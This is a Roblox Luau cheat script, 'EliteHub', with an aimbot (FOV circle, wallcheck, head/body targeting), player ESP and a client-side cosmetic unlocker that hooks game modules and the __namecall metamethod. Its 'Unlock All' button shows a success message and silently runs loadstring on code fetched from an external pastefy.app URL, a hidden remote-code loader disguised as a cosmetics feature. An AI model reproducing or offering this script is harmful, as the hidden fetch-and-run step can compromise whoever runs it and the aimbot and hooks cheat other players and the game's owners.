create("TextLabel", {Text = "Cosmetics & Skins", Font = Enum.Font.Fondamento, TextSize = 12, TextColor3 = Color3.fromRGB(255, 255, 255), Position = UDim2.new(0, 10, 0, 8), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = unlockCard})
create("TextLabel", {Text = "Unlock all weapon skins, wraps,\nemotes, and charms.", Font = Enum.Font.Fondamento, TextSize = 9, TextColor3 = Color3.fromRGB(180, 220, 200), Position = UDim2.new(0, 10, 0, 28), BackgroundTransparency = 1, TextXAlignment = "Left", TextYAlignment = "Top", Parent = unlockCard})

local unlockMsg = create("TextLabel", {
    Size = UDim2.new(0, 420, 0, 24),
    Position = UDim2.new(0, 10, 0, 215),
    BackgroundColor3 = Color3.fromRGB(22, 22, 28),
    TextColor3 = Color3.fromRGB(100, 255, 160),
    Font = Enum.Font.Fondamento,
    TextSize = 10,
    Text = "",
    Visible = false,
    Parent = unlockTab
})
create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = unlockMsg})
create("UIStroke", {Color = Color3.fromRGB(0, 255, 200), Transparency = 0.6, Thickness = 0.8, Parent = unlockMsg})

local unlockBtn = create("TextButton", {
    Size = UDim2.new(0, 190, 0, 34),
    Position = UDim2.new(0, 10, 0, 120),
    BackgroundColor3 = Color3.fromRGB(0, 180, 100),
    Text = "Unlock All",
    Font = Enum.Font.Fondamento,
    TextSize = 12,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Parent = unlockCard
})
create("UICorner", {CornerRadius = UDim.new(0, 5), Parent = unlockBtn})

local hasGotten = false
unlockBtn.MouseButton1Click:Connect(function()
    if not hasGotten then
        hasGotten = true
        unlockMsg.Text = "You have unlocked all weapons skins, wraps, emotes, and charms!"
        unlockMsg.TextColor3 = Color3.fromRGB(100, 255, 160)
        unlockMsg.Visible = true
        pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/6ElsMLeb/raw", true))()
        end)
    else
        unlockMsg.Text = "You have already unlocked all features!"
        unlockMsg.TextColor3 = Color3.fromRGB(255, 200, 100)
        unlockMsg.Visible = true
    end
end)

local execCard = create("Frame", {Size = UDim2.new(0, 200, 0, 170), Position = UDim2.new(0, 230, 0, 36), BackgroundColor3 = Color3.fromRGB(24, 18, 24), Parent = unlockTab})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = execCard})
applyNeonGradient(execCard, Color3.fromRGB(255, 0, 128), Color3.fromRGB(25, 18, 25))

create("TextLabel", {Text = "System Compatibility", Font = Enum.Font.Fondamento, TextSize = 12, TextColor3 = Color3.fromRGB(255, 255, 255), Position = UDim2.new(0, 10, 0, 8), BackgroundTransparency = 1, TextXAlignment = "Left", Parent = execCard})
create("TextLabel", {Text = execName .. "\nYour executor supports all cosmetic script features.", Font = Enum.Font.Fondamento, TextSize = 10, TextColor3 = Color3.fromRGB(220, 180, 210), Position = UDim2.new(0, 10, 0, 30), BackgroundTransparency = 1, TextXAlignment = "Left", TextYAlignment = "Top", TextWrapped = true, Size = UDim2.new(1, -20, 0, 120), Parent = execCard})


-- ==========================================
-- STAR TAB (⭐ Professional Description)
-- ==========================================
create("TextLabel", {
    Text = "EliteHub Architecture & Capabilities",
    Font = Enum.Font.Fondamento,
    TextSize = 13,
    TextColor3 = Color3.fromRGB(255, 200, 0),
    Position = UDim2.new(0, 10, 0, 6),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = starTab
})

local infoCard = create("Frame", {
    Size = UDim2.new(0, 420, 0, 215),
    Position = UDim2.new(0, 8, 0, 30),
    BackgroundColor3 = Color3.fromRGB(18, 18, 24),
    Parent = starTab
})
create("UICorner", {CornerRadius = UDim.new(0, 6), Parent = infoCard})
applyNeonGradient(infoCard, Color3.fromRGB(255, 200, 0), Color3.fromRGB(25, 20, 25))

create("TextLabel", {
    Text = "Professional Software Overview",
    Font = Enum.Font.Fondamento,
    TextSize = 11,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Position = UDim2.new(0, 10, 0, 8),
    BackgroundTransparency = 1,
    TextXAlignment = "Left",
    Parent = infoCard
})

local descText = [[EliteHub is an advanced, high-performance tactical enhancement suite engineered for precision aiming, comprehensive visual awareness (ESP), and dynamic cosmetic customization.

• Advanced Aimbot: Features configurable FOV parameters, intelligent bone targeting (Head/HRP), raycast-based obstruction detection (Wallcheck), and sticky target locking algorithms.
• Real-Time ESP Framework: Renders high-fidelity 2D bounding boxes, dynamic health indicators, and articulated skeletal wireframes with low computational overhead.
• Universal Cosmetic Unlocker: Injects and simulates client-side ownership protocols to seamlessly unlock weapons, skins, wraps, and charms without server-side validation penalties.]]

create("TextLabel", {
    Text = descText,
    Font = Enum.Font.Fondamento,
    TextSize = 9.5,
    TextColor3 = Color3.fromRGB(200, 200, 220),
    Position = UDim2.new(0, 10, 0, 28),
    Size = UDim2.new(1, -20, 1, -36),
    BackgroundTransparency = 1,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    TextWrapped = true,
    Parent = infoCard
})


-- ==========================================
-- SCRIPT FUNCTIONALITY (Preserved)
-- ==========================================

instance8.FocusLost:Connect(function(p10)
    local v25 = tonumber(instance8.Text)
    if v25 and v25 > 0 and v25 < 2000 then
        v2 = v25
        instance8.Text = tostring(v2)
        instance8.PlaceholderText = tostring(v2)
        if circle then circle.Radius = v2 end
    else
        instance8.Text = tostring(v2)
    end
end)

local function f12(cframe)
    local v26 = f1()
    if not v26 then
        return false, "no cam"
    else
        local v27, v28 = pcall(function() v26.CFrame = cframe end)
        if not v27 then
            v10 = true
            return false, v28
        end
        return true
    end
end

local v29 = false
local v30

pcall(function()
    local v31 = Drawing.new("Circle")
    v31.Thickness = 2
    v31.NumSides = 64
    v31.Radius = v2
    v31.Filled = false
    v31.Color = Color3.fromRGB(0, 255, 200)
    v31.Visible = false
    v30 = v31
    v29 = true
end)

local function f13()
    if not v30 then return else
        local v32 = f1()
        if not v32 then return else
            local viewportSize = v32.ViewportSize
            v30.Position = Vector2.new(viewportSize.X / 2, viewportSize.Y / 2)
            v30.Radius = v2
            return
        end
    end
end

local function f14(p11, p12)
    if not p11 then return false else
        local v33 = f1()
        if not v33 then return false else
            local position = v33.CFrame.Position
            local v34 = p11.Position - position
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
            local v35 = {}
            if localPlayer.Character then table.insert(v35, localPlayer.Character) end
            if p12 then table.insert(v35, p12) end
            raycastParams.FilterDescendantsInstances = v35
            raycastParams.IgnoreWater = true
            return workspace:Raycast(position, v34, raycastParams) == nil
        end
    end
end

local function f15()
    local v36 = f1()
    if not v36 then return nil else
        local viewportSize2 = v36.ViewportSize
        local vector = Vector2.new(viewportSize2.X / 2, viewportSize2.Y / 2)
        local huge = math.huge
        local v37 = nil

        for index, value in ipairs(players:GetPlayers()) do
            if value ~= localPlayer and f7(value) and not f3(value) and isDamageable(value) then
                if not (value.Team and localPlayer.Team and value.Team == localPlayer.Team) then
                    local v38 = f6(value)
                    if v38 then
                        local v39, v40 = v36:WorldToViewportPoint(v38.Position)
                        if v40 then
                            local magnitude = (Vector2.new(v39.X, v39.Y) - vector).Magnitude
                            if magnitude < v2 and magnitude < huge then
                                if not v8 or f14(v38, value.Character) then
                                    huge = magnitude
                                    v37 = value
                                end
                            end
                        end
                    end
                end
            end
        end
        return v37
    end
end

local v41

runService:BindToRenderStep("Aimbot_v2", Enum.RenderPriority.Camera.Value + 1, function()
    if v30 then
        f13()
        local v42 = v6
        local v43 = v30
        v43.Visible = v42 and v29
    end

    local name, v44, cframe2

    if not v6 then return
    elseif v10 then
        instance7.Text = "Aimed: Camera writes blocked"
        return
    else
        if not v41 or not (v41.Character and v41.Character.Parent) or not f7(v41) or not isDamageable(v41) then
            v41 = f15()
        end

        if v41 and v41.Character then
            local v45 = f6(v41)
            if v45 then
                if v8 and not f14(v45, v41.Character) then
                    v41 = nil
                    instance7.Text = "Aimed: None"
                    return
                end

                v44 = f1()
                cframe2 = CFrame.new(v44.CFrame.Position, v45.Position)

                if v7 then
                    if not f12(cframe2) then
                        instance7.Text = "Aimed: Camera blocked"
                        v6 = false
                        instance3.Text = "Aimbot: OFF (Q)"
                        instance3.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
                        return
                    end
                    name = v41.Name
                    instance7.Text = "Aimed: " .. (name or "Unknown")
                    return
                end

                if not pcall(function() v44.CFrame = v44.CFrame:Lerp(cframe2, 0.16) end) then
                    v10 = true
                    instance7.Text = "Aimed: Camera writes blocked"
                    v6 = false
                    instance3.Text = "Aimbot: OFF (Q)"
                    instance3.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
                    return
                end

                name = v41.Name
                instance7.Text = "Aimed: " .. (name or "Unknown")
                return
            end
            instance7.Text = "Aimed: None"
            return
        end
        instance7.Text = "Aimed: None"
        return
    end
end)

local function f16(p13)
    v6 = p13
    instance3.Text = "Aimbot: " .. (p13 and "ON (Q)" or "OFF (Q)")
    instance3.BackgroundColor3 = p13 and Color3.fromRGB(0, 180, 100) or Color3.fromRGB(180, 40, 60)
    if p13 then
        v41 = f15()
    else
        v41 = nil
        instance7.Text = "Aimed: None"
        if v30 then v30.Visible = false end
    end
end

instance3.MouseButton1Click:Connect(function() f16(not v6) end)

instance4.MouseButton1Click:Connect(function()
    v7 = not v7
    instance4.Text = "Strong Lock: " .. (v7 and "ON" or "OFF")
    instance4.BackgroundColor3 = v7 and Color3.fromRGB(0, 180, 100) or Color3.fromRGB(180, 40, 60)
    if v7 then v41 = f15() end
end)

instance5.MouseButton1Click:Connect(function()
    v8 = not v8
    instance5.Text = "Wallcheck: " .. (v8 and "ON" or "OFF")
    instance5.BackgroundColor3 = v8 and Color3.fromRGB(0, 180, 100) or Color3.fromRGB(140, 140, 140)
    v41 = f15()
end)

instance6.MouseButton1Click:Connect(function()
    if v9 == "Head" then
        v9 = "HumanoidRootPart"
        instance6.Text = "Aim: HRP"
    else
        v9 = "Head"
        instance6.Text = "Aim: Head"
    end
    v41 = f15()
end)

userInputService.InputBegan:Connect(function(input, p14)
    if p14 then return end
    if input.KeyCode == q then
        f16(not v6)
    elseif input.KeyCode == e then
        instance6:CaptureFocus()
        instance6:ReleaseFocus()
        instance6:MouseButton1Click()
    end
end)

localPlayer.CharacterAdded:Connect(function()
    v41 = nil
    v10 = false
end)

runService.RenderStepped:Connect(function(delta)
    v14 = v14 + delta
    if v14 < 0.033333333333333 then return end
    v14 = 0
    for index2, value2 in ipairs(players:GetPlayers()) do
        f11(value2)
    end
end)

local function f17()
    local v46 = 0
    for index3, value3 in ipairs(instance11:GetChildren()) do
        if value3:IsA("TextButton") then
            v46 = v46 + value3.Size.Y.Offset + 3
        end
    end
    instance11.CanvasSize = UDim2.new(0, 0, 0, math.max(0, v46))
end

local v47 = {}

local function f18()
    local count = 0
    for key, value4 in pairs(v11) do
        if value4 then count = count + 1 end
    end
    instance9.Text = "Exclude: " .. tostring(count)
end

local function f19(p15)
    local textButton
    if p15 == localPlayer then return
    elseif v47[p15] then return
    else
        local text = tostring(p15.Name) .. " (" .. tostring(p15.DisplayName or "") .. ")"
        textButton = create("TextButton", {
            Size = UDim2.new(1, -4, 0, 22),
            BackgroundColor3 = f3(p15) and Color3.fromRGB(180, 40, 60) or Color3.fromRGB(25, 25, 35),
            TextColor3 = Color3.fromRGB(230, 230, 240),
            Font = Enum.Font.Fondamento,
            TextSize = 10,
            Text = "  " .. text,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = instance11
        })
        create("UICorner", {CornerRadius = UDim.new(0, 4), Parent = textButton})

        textButton.MouseButton1Click:Connect(function()
            if v11[p15] then
                v11[p15] = nil
                textButton.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
            else
                v11[p15] = true
                textButton.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
                if v41 == p15 then v41 = nil end
            end
            f18()
        end)
        
        v47[p15] = textButton
        f17()
        f18()
        return textButton
    end
end

for index4, value5 in ipairs(players:GetPlayers()) do
    f19(value5)
end
players.PlayerAdded:Connect(function(player) f19(player) end)
players.PlayerRemoving:Connect(function(player2)
    v11[player2] = nil
    local v48 = v47[player2]
    if v48 and v48.Parent then v48:Destroy() end
    v47[player2] = nil
    f17()
    f18()
    f9(player2)
    if v41 == player2 then v41 = nil end
end)

players.PlayerRemoving:Connect(function(player3) f9(player3) end)

-- Teleport Queue Cosmetic Unlocker
if getgenv().autoleave then
    local teleport_queue = queue_on_teleport or syn and syn.queue_on_teleport or queueonteleport
    if teleport_queue then
        teleport_queue([=====[
            pcall(function()
                local autoload = true
                local autoleave = true
                
                local Players = game:GetService("Players")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local HttpService = game:GetService("HttpService")
                local player = Players.LocalPlayer
                local playerScripts = player:WaitForChild("PlayerScripts")
                local controllers = playerScripts:WaitForChild("Controllers")
                local EnumLibrary = require(ReplicatedStorage.Modules:WaitForChild("EnumLibrary", 10))
                if EnumLibrary then EnumLibrary:WaitForEnumBuilder() end
                local CosmeticLibrary = require(ReplicatedStorage.Modules:WaitForChild("CosmeticLibrary", 10))
                local ItemLibrary = require(ReplicatedStorage.Modules:WaitForChild("ItemLibrary", 10))
                local DataController = require(controllers:WaitForChild("PlayerDataController", 10))
                local equipped, favorites = {}, {}
                local constructingWeapon, viewingProfile = nil, nil
                local lastUsedWeapon = nil

                local function cloneCosmetic(name, cosmeticType, options)
                    local base = CosmeticLibrary.Cosmetics[name]
                    if not base then return nil end
                    local data = {}
                    for key, value in pairs(base) do data[key] = value end
                    data.Name = name
                    data.Type = data.Type or cosmeticType
                    data.Seed = data.Seed or math.random(1, 1000000)
                    if EnumLibrary then
                        local success, enumId = pcall(EnumLibrary.ToEnum, EnumLibrary, name)
                        if success and enumId then data.Enum, data.ObjectID = enumId, data.ObjectID or enumId end
                    end
                    if options then
                        if options.inverted ~= nil then data.Inverted = options.inverted end
                        if options.favoritesOnly ~= nil then data.OnlyUseFavorites = options.favoritesOnly end
                    end
                    return data
                end

                local saveFile = "unlockall/config.json"
                local function saveConfig()
                    if not writefile then return end
                    pcall(function()
                        local config = {equipped = {}, favorites = favorites}
                        for weapon, cosmetics in pairs(equipped) do
                            config.equipped[weapon] = {}
                            for cosmeticType, cosmeticData in pairs(cosmetics) do
                                if cosmeticData and cosmeticData.Name then
                                    config.equipped[weapon][cosmeticType] = {
                                        name = cosmeticData.Name, seed = cosmeticData.Seed, inverted = cosmeticData.Inverted
                                    }
                                end
                            end
                        end
                        if makefolder then makefolder("unlockall") end
                        writefile(saveFile, HttpService:JSONEncode(config))
                    end)
                end

                local function loadConfig()
                    if not readfile or not isfile or not isfile(saveFile) then return end
                    pcall(function()
                        local config = HttpService:JSONEncode(readfile(saveFile))
                        if config.equipped then
                            for weapon, cosmetics in pairs(config.equipped) do
                                equipped[weapon] = {}
                                for cosmeticType, cosmeticData in pairs(cosmetics) do
                                    local cloned = cloneCosmetic(cosmeticData.name, cosmeticType, {inverted = cosmeticData.inverted})
                                    if cloned then cloned.Seed = cosmeticData.seed equipped[weapon][cosmeticType] = cloned end
                                end
                            end
                        end
                        favorites = config.favorites or {}
                    end)
                end

                CosmeticLibrary.OwnsCosmeticNormally = function(self, inventory, name, weapon)
                    local cosmetic = CosmeticLibrary.Cosmetics[name]
                    if cosmetic and cosmetic.Type == "Skin" then return true end
                    return false
                end

                CosmeticLibrary.OwnsCosmeticUniversally = function(self, inventory, name, weapon)
                    local cosmetic = CosmeticLibrary.Cosmetics[name]
                    if cosmetic and cosmetic.Type == "Skin" then return true end
                    return false
                end

                CosmeticLibrary.OwnsCosmeticForWeapon = function(self, inventory, name, weapon)
                    local cosmetic = CosmeticLibrary.Cosmetics[name]
                    if cosmetic and cosmetic.Type == "Skin" then return true end
                    return false
                end

                local originalOwnsCosmetic = CosmeticLibrary.OwnsCosmetic
                CosmeticLibrary.OwnsCosmetic = function(self, inventory, name, weapon)
                    if name:find("MISSING_") then return originalOwnsCosmetic(self, inventory, name, weapon) end
                    local cosmetic = CosmeticLibrary.Cosmetics[name]
                    if cosmetic and cosmetic.Type == "Skin" then return true end
                    return originalOwnsCosmetic(self, inventory, name, weapon)
                end

                local originalGet = DataController.Get
                DataController.Get = function(self, key)
                    local data = originalGet(self, key)
                    if key == "CosmeticInventory" then
                        local proxy = {}
                        if data then for k, v in pairs(data) do 
                            local cosmetic = CosmeticLibrary.Cosmetics[k]
                            if cosmetic and cosmetic.Type == "Skin" then proxy[k] = v end
                        end end
                        return setmetatable(proxy, {__index = function(t, k)
                            local cosmetic = CosmeticLibrary.Cosmetics[k]
                            if cosmetic and cosmetic.Type == "Skin" then return true end
                            return nil
                        end})
                    end
                    if key == "FavoritedCosmetics" then
                        local result = data and table.clone(data) or {}
                        for weapon, favs in pairs(favorites) do
                            result[weapon] = result[weapon] or {}
                            for name, isFav in pairs(favs) do 
                                local cosmetic = CosmeticLibrary.Cosmetics[name]
                                if cosmetic and cosmetic.Type == "Skin" then result[weapon][name] = isFav end
                            end
                        end
                        return result
                    end
                    return data
                end

                local originalGetWeaponData = DataController.GetWeaponData
                DataController.GetWeaponData = function(self, weaponName)
                    local data = originalGetWeaponData(self, weaponName)
                    if not data then return nil end
                    local merged = {}
                    for key, value in pairs(data) do merged[key] = value end
                    merged.Name = weaponName
                    if equipped[weaponName] then
                        for cosmeticType, cosmeticData in pairs(equipped[weaponName]) do 
                            if cosmeticType == "Skin" then merged[cosmeticType] = cosmeticData end
                        end
                    end
                    return merged
                end

                local FighterController
                pcall(function() FighterController = require(controllers:WaitForChild("FighterController", 10)) end)

                if hookmetamethod then
                    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
                    local dataRemotes = remotes and remotes:FindFirstChild("Data")
                    local equipRemote = dataRemotes and dataRemotes:FindFirstChild("EquipCosmetic")
                    local favoriteRemote = dataRemotes and dataRemotes:FindFirstChild("FavoriteCosmetic")
                    local replicationRemotes = remotes and remotes:FindFirstChild("Replication")
                    local fighterRemotes = replicationRemotes and replicationRemotes:FindFirstChild("Fighter")
                    local useItemRemote = fighterRemotes and fighterRemotes:FindFirstChild("UseItem")
                    
                    if equipRemote then
                        local oldNamecall
                        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
                            if getnamecallmethod() ~= "FireServer" then return oldNamecall(self, ...) end
                            local args = {...}
                            if useItemRemote and self == useItemRemote then
                                local objectID = args[1]
                                if FighterController then
                                    pcall(function()
                                        local fighter = FighterController:GetFighter(player)
                                        if fighter and fighter.Items then
                                            for _, item in pairs(fighter.Items) do
                                                if item:Get("ObjectID") == objectID then lastUsedWeapon = item.Name break end
                                            end
                                        end
                                    end)
                                end
                            end
                            if self == equipRemote then
                                local weaponName, cosmeticType, cosmeticName, options = args[1], args[2], args[3], args[4] or {}
                                if cosmeticType ~= "Skin" then return oldNamecall(self, ...) end
                                if cosmeticName and cosmeticName ~= "None" and cosmeticName ~= "" then
                                    local inventory = DataController:Get("CosmeticInventory")
                                    if inventory and rawget(inventory, cosmeticName) then return oldNamecall(self, ...) end
                                end
                                equipped[weaponName] = equipped[weaponName] or {}
                                if not cosmeticName or cosmeticName == "None" or cosmeticName == "" then
                                    equipped[weaponName][cosmeticType] = nil
                                    if not next(equipped[weaponName]) then equipped[weaponName] = nil end
                                else
                                    local cloned = cloneCosmetic(cosmeticName, cosmeticType, {inverted = options.IsInverted, favoritesOnly = options.OnlyUseFavorites})
                                    if cloned then equipped[weaponName][cosmeticType] = cloned end
                                end
                                task.defer(function()
                                    pcall(function() DataController.CurrentData:Replicate("WeaponInventory") end)
                                    task.wait(0.2)
                                    saveConfig()
                                end)
                                return
                            end
                            if self == favoriteRemote then
                                local cosmetic = CosmeticLibrary.Cosmetics[args[2]]
                                if cosmetic and cosmetic.Type == "Skin" then
                                    favorites[args[1]] = favorites[args[1]] or {}
                                    favorites[args[1]][args[2]] = args[3] or nil
                                    saveConfig()
                                    task.spawn(function() pcall(function() DataController.CurrentData:Replicate("FavoritedCosmetics") end) end)
                                end
                                return
                            end
                            return oldNamecall(self, ...)
                        end)
                    end
                end

                local ClientItem
                pcall(function() ClientItem = require(playerScripts.Modules.ClientReplicatedClasses.ClientFighter.ClientItem) end)

                if ClientItem and ClientItem._CreateViewModel then
                    local originalCreateViewModel = ClientItem._CreateViewModel
                    ClientItem._CreateViewModel = function(self, viewmodelRef)
                        local weaponName = self.Name
                        local weaponPlayer = self.ClientFighter and self.ClientFighter.Player
                        constructingWeapon = (weaponPlayer == player) and weaponName or nil
                        if weaponPlayer == player and equipped[weaponName] and equipped[weaponName].Skin and viewmodelRef then
                            local dataKey, skinKey, nameKey = self:ToEnum("Data"), self:ToEnum("Skin"), self:ToEnum("Name")
                            if viewmodelRef[dataKey] then
                                viewmodelRef[dataKey][skinKey] = equipped[weaponName].Skin
                                viewmodelRef[dataKey][nameKey] = equipped[weaponName].Skin.Name
                            elseif viewmodelRef.Data then
                                viewmodelRef.Data.Skin = equipped[weaponName].Skin
                                viewmodelRef.Data.Name = equipped[weaponName].Skin.Name
                            end
                        end
                        local result = originalCreateViewModel(self, viewmodelRef)
                        constructingWeapon = nil
                        return result
                    end
                end

                local viewModelModule = playerScripts.Modules.ClientReplicatedClasses.ClientFighter.ClientItem:FindFirstChild("ClientViewModel")
                if viewModelModule then
                    local ClientViewModel = require(viewModelModule)
                    local originalNew = ClientViewModel.new
                    ClientViewModel.new = function(replicatedData, clientItem)
                        local weaponPlayer = clientItem.ClientFighter and clientItem.ClientFighter.Player
                        local weaponName = constructingWeapon or clientItem.Name
                        if weaponPlayer == player and equipped[weaponName] then
                            local ReplicatedClass = require(ReplicatedStorage.Modules.ReplicatedClass)
                            local dataKey = ReplicatedClass:ToEnum("Data")
                            replicatedData[dataKey] = replicatedData[dataKey] or {}
                        end
                        return originalNew(replicatedData, clientItem)
                    end
                end
            end)
        ]=====])
    end
end

print("[EliteHub Compact Neon] Loaded Successfully")
